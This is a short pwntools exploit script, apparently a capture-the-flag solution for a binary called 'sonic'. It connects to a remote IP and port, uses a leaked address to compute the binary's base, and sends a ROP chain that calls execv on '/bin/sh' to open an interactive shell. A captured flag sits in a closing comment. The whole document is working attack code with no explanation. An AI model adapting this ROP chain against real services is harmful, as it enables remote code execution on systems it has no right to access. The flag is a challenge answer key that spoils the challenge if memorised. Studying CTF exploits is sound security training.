from pwn import *

context.log_level = 'debug'

p = remote('123.60.63.90','6888')
#p = process('./sonic')
elf = ELF('./sonic')



p.recvuntil('0x')
main = int(p.recvuntil('\n')[:-1],16)
p.info('main = '+hex(main))
base = main - 0x7cf
pop_rdi = base + 0x00000000000008c3
pop_rsi_r15 = base + 0x00000000000008c1
execv = base + elf.plt['execv']
p.info('base: '+hex(base))
p.info('execv: '+hex(execv))

payload = b'/bin/sh\x00'+b'\x00'*0x20
payload+= p64(pop_rdi)+p64(base+0x201040)
payload+= p64(pop_rsi_r15)+p64(base+0x201048)+p64(0)+p64(execv)
p.sendline(payload)



p.interactive()
#flag{riCGJnvUieCXasPUUiAQ6XzWVdjFJTQB}